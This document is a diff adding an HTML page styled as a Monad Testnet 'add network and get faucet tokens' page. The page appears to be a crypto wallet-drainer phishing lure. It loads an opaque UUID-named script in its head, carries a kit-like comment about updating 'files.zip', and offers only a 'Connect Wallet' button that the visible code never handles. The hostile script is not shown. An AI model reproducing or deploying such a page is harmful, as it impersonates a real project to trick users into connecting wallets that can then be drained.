@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script charset="UTF-8" type="text/javascript" src="./f9ab1cc4-11e5-4bfb-b584-3cf1eb36a4a6.js"></script><!–– Please update files.zip if you not already did and check below (updated the 11/11) ––>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Add Monad Testnet to your wallet and get tokens from the faucet.">
+    <title>Add Monad Testnet</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-purple: #7C4DFF;
+            --primary-purple-light: #9E7CFF;
+            --primary-purple-dark: #5A2EE0;
+            --dark-bg: #0A0A19;
+            --card-bg: #1A1A2E;
+            --text-primary: #FFFFFF;
+            --text-secondary: rgba(255, 255, 255, 0.7);
+            --transition-speed: 0.3s;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background: radial-gradient(ellipse at top, #1A1A3A, var(--dark-bg) 60%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem 1rem;
+            line-height: 1.5;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* Starry background effect */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: -1;
+            opacity: 0.2;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            text-align: center;
+            z-index: 1;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            line-height: 1.2;
+            background: linear-gradient(to right, var(--primary-purple-light), var(--primary-purple));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .description {
+            font-size: 1.125rem;
+            color: var(--text-secondary);
+            max-width: 700px;
+            margin: 0 auto 3rem;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 2rem;
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 
+                        0 0 40px rgba(124, 77, 255, 0.1) inset;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(124, 77, 255, 0.1);
+            transform: translateY(0);
+            transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6), 
+                       0 0 50px rgba(124, 77, 255, 0.15) inset;
+        }
+
+        .card-header {
+            color: var(--text-secondary);
+            font-size: 0.875rem;
+            font-weight: 500;
+            margin-bottom: 0.75rem;
+        }
+
+        .card-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+        }
+
+        .card-description {
+            color: var(--text-secondary);
+            font-size: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .token-graphics {
+            margin: 1.5rem auto;
+            height: 120px;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            perspective: 600px;
+        }
+
+        .token {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--primary-purple-light), var(--primary-purple-dark));
+            border-radius: 16px;
+            position: absolute;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+            animation: float 6s infinite ease-in-out;
+        }
+
+        .token:nth-child(1) {
+            transform: translate(-40px, -20px) rotateX(45deg) rotateZ(45deg);
+            animation-delay: 0s;
+        }
+
+        .token:nth-child(2) {
+            transform: translate(10px, -10px) rotateX(65deg) rotateZ(30deg);
+            animation-delay: 0.5s;
+        }
+
+        .token:nth-child(3) {
+            transform: translate(60px, 5px) rotateX(35deg) rotateZ(60deg);
+            animation-delay: 1s;
+        }
+
+        .token:nth-child(4) {
+            transform: translate(0, 30px) rotateX(55deg) rotateZ(20deg);
+            animation-delay: 1.5s;
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0) rotateX(45deg) rotateZ(45deg);
+            }
+            50% {
+                transform: translateY(-15px) rotateX(45deg) rotateZ(45deg);
+            }
+        }
+
+        .button {
+            display: block;
+            width: 100%;
+            background: var(--primary-purple);
+            color: white;
+            border: none;
+            padding: 1rem;
+            border-radius: 2rem;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color var(--transition-speed),
+                        transform var(--transition-speed),
+                        box-shadow var(--transition-speed);
+            position: relative;
+            overflow: hidden;
+            text-decoration: none;
+        }
+
+        .button:hover {
+            background: var(--primary-purple-light);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(124, 77, 255, 0.4);
+        }
+
+        .button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 5px rgba(124, 77, 255, 0.4);
+        }
+
+        .button::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+
+        .button:focus:not(:active)::after {
+            animation: ripple 1s ease-out;
+        }
+
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 0.5;
+            }
+            20% {
+                transform: scale(25, 25);
+                opacity: 0.3;
+            }
+            100% {
+                opacity: 0;
+                transform: scale(40, 40);
+            }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+
+            .description {
+                font-size: 1rem;
+                padding: 0 1rem;
+            }
+
+            .card {
+                padding: 1.5rem;
+            }
+
+            .token-graphics {
+                height: 100px;
+            }
+
+            .token {
+                width: 50px;
+                height: 50px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.75rem;
+            }
+
+            .card-title {
+                font-size: 1.25rem;
+            }
+
+            .token {
+                width: 40px;
+                height: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Add Monad Testnet</h1>
+        <p class="description">
+            Monad Testnet is a risk-free environment for building, experimenting, and 
+            having fun with crypto. Let's get you started by adding the network.
+        </p>
+        
+        <div class="card">
+            <p class="card-header">Let's get started</p>
+            <h2 class="card-title">Add Testnet & Get tokens</h2>
+            <p class="card-description">
+                If you're new here, add testnet to your wallet and get tokens from the Faucet page.
+            </p>
+            
+            <div class="token-graphics">
+                <div class="token"></div>
+                <div class="token"></div>
+                <div class="token"></div>
+                <div class="token"></div>
+            </div>
+            
+            <button class="Style interact-button" style="
+  background-color: #007BFF;
+  color: white;
+  padding: 10px 20px;
+  border: none;
+  border-radius: 8px;
+  cursor: pointer;
+  font-size: 16px;
+  transition: background-color 0.3s ease;
+">
+  Connect Wallet
+</button>
+
+        </div>
+    </div>
+
+    <script>
+        // Add subtle parallax effect to tokens on mouse move
+        document.addEventListener('mousemove', (e) => {
+            const tokens = document.querySelectorAll('.token');
+            const moveX = (e.clientX - window.innerWidth / 2) / 25;
+            const moveY = (e.clientY - window.innerHeight / 2) / 25;
+            
+            tokens.forEach((token, index) => {
+                const factor = (index + 1) * 0.2;
+                token.style.transform = `translate(${token.dataset.baseX || 0}px, ${token.dataset.baseY || 0}px) 
+                                        rotateX(${45 + moveY * factor}deg) 
+                                        rotateZ(${45 + moveX * factor}deg)`;
+            });
+        });
+
+        // Store original positions for tokens
+        document.addEventListener('DOMContentLoaded', () => {
+            const tokens = document.querySelectorAll('.token');
+            const positions = [
+                { x: -40, y: -20 },
+                { x: 10, y: -10 },
+                { x: 60, y: 5 },
+                { x: 0, y: 30 }
+            ];
+            
+            tokens.forEach((token, index) => {
+                token.dataset.baseX = positions[index].x;
+                token.dataset.baseY = positions[index].y;
+            });
+        });
+    </script>
+</body>
+</html>
